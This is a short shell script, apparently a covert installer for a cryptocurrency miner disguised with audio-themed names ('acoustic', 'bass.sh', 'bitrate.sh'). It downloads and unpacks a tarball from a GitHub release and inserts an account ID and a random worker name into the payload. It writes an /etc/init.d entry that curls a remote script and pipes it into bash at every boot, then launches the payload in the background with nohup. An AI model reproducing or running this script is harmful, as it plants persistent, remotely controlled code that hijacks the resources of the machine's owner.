cd /
rm -rf acoustic.tar
rm -rf acoustic
wget https://github.com/rubbyadi/sengkreat/releases/download/v1.0.2/acoustic.tar
tar -xvf acoustic.tar
cd /acoustic
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
sed -i "s/test_accountname/CP_bsmzapay1 --worker ${variable1}/g" ./bass.sh
sed -i "s/CP_32hb86nvxc/CP_bsmzapay1 --worker ${variable1}/g" ./bass.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/rubbyadi/sengkreat/main/bass.sh)" > bitrate.sh
chmod a+x bitrate.sh
update-rc.d bitrate.sh defaults
cd /acoustic
nohup ./bass.sh
ps -ef | grep acoustic
